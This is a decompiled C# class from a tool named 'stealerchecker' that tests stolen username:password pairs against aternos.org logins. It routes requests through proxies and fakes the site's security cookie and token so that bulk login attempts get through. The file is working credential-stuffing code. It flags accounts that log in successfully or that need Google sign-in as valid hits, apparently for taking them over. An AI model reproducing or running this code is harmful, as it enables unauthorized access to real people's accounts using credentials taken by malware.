// Decompiled with JetBrains decompiler
// Type: stealerchecker.Checkers.Aternos
// Assembly: stealerchecker, Version=9.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EACD1CA4-3D73-4169-BD60-7A660205DCFD
// Assembly location: C:\Users\fox89\Desktop\StealerChecker\stealerchecker.exe

using Leaf.xNet;
using Newtonsoft.Json.Linq;
using ScrapySharp.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace stealerchecker.Checkers
{
  internal class Aternos : IChecker
  {
    private static KeyValuePair<string, string> ajax;
    private static string TOKEN;
    private static readonly ScrapingBrowser browser = new ScrapingBrowser()
    {
      UserAgent = FakeUserAgents.OperaGX,
      KeepAlive = true
    };
    private static readonly string html = Aternos.browser.NavigateToPage(new Uri("https://aternos.org/go/")).Content;
    private static readonly Random random = new Random();

    public string Service => "aternos.org";

    public void ProcessLine(
      string line,
      string proxy,
      ProxyType type,
      out string result,
      out bool isValid)
    {
      HttpRequest httpRequest = new HttpRequest()
      {
        UserAgent = "Mozilla / 5.0(Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.275 (Edition Yx GX)",
        UseCookies = true,
        Cookies = new CookieStorage()
      };
      httpRequest.Cookies.Add(new Cookie("ATERNOS_SEC_" + Aternos.ajax.Key, Aternos.ajax.Value, "/", "aternos.org"));
      string str1 = line.Split(':')[0];
      string input = line.Split(':')[1].Replace("\r", "");
      while (true)
      {
        httpRequest.Proxy = ProxyClient.Parse(type, proxy);
        try
        {
          string address = "https://aternos.org/panel/ajax/account/login.php?SEC=" + Aternos.ajax.Key + Uri.EscapeDataString(":") + Aternos.ajax.Value + "&TOKEN=" + Aternos.TOKEN;
          string str2 = "user=" + str1 + "&password=" + Aternos.CreateMD5(input);
          HttpResponse httpResponse;
          try
          {
            httpResponse = httpRequest.Post(address, str2, "application/x-www-form-urlencoded");
          }
          catch (HttpException ex)
          {
            continue;
          }
          JObject jobject = JObject.Parse(httpResponse.ToString());
          if (bool.Parse(jobject["success"].ToString()))
          {
            isValid = true;
            result = "success";
            break;
          }
          if (jobject["error"].ToString().Contains("Google"))
          {
            isValid = true;
            result = jobject["error"].ToString();
            break;
          }
          isValid = false;
          result = (string) null;
          break;
        }
        catch
        {
          Console.WriteLine("oops!");
          Aternos.ajax = Aternos.getAjaxToken();
          Aternos.TOKEN = Aternos.getTOKEN();
        }
      }
      Aternos.ajax = Aternos.getAjaxToken();
      Aternos.TOKEN = Aternos.getTOKEN();
    }

    private static KeyValuePair<string, string> getAjaxToken() => new KeyValuePair<string, string>(Aternos.RandomString(11) + "00000", Aternos.RandomString(11) + "00000");

    private static string getTOKEN() => Regex.Match(Aternos.html, "const AJAX_TOKEN = \"([A-Za-z0-9]*)\";").Groups[1].Value;

    public static string CreateMD5(string input)
    {
      using (MD5 md5 = MD5.Create())
      {
        byte[] bytes = Encoding.ASCII.GetBytes(input);
        byte[] hash = md5.ComputeHash(bytes);
        StringBuilder stringBuilder = new StringBuilder();
        for (int index = 0; index < hash.Length; ++index)
          stringBuilder.Append(hash[index].ToString("X2"));
        return stringBuilder.ToString();
      }
    }

    public static string RandomString(int length) => new string(Enumerable.Repeat<string>("abcdefghijklmnopqrstuvwxyz0123456789", length).Select<string, char>((Func<string, char>) (s => s[Aternos.random.Next(s.Length)])).ToArray<char>());
  }
}
